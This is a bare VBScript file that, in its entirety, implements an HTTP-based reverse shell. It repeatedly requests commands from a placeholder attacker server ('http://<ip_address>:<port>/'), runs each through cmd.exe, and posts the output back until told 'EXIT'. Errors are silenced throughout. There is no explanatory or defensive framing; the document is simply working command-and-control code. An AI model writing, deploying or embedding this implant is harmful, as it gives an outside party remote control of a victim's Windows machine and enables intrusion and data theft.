Option Explicit
On Error Resume Next
Dim XmlHttpReq, Shell, ExecObj, Break, Result
Set Shell = CreateObject("WScript.Shell")
Break = False
While Break <> True
    Set XmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
    XmlHttpReq.Open "GET", "http://<ip_address>:<port>/", false
    XmlHttpReq.Send
    If InStr(XmlHttpReq.responseText, "EXIT") Then
        Break = True
    ElseIf (Len(Trim(XmlHttpReq.responseText)) > 0) Then
        Set ExecObj = Shell.Exec(("C:\Windows\System32\cmd.exe /c " & Trim(XmlHttpReq.responseText)))
        Result = ""
        Do Until ExecObj.StdOut.AtEndOfStream
            Result = Result & ExecObj.StdOut.ReadAll()
        Loop
        Set XmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
        XmlHttpReq.Open "POST", "http://<ip_address>:<port>/", false
        XmlHttpReq.Send(Result)
    End If
Wend
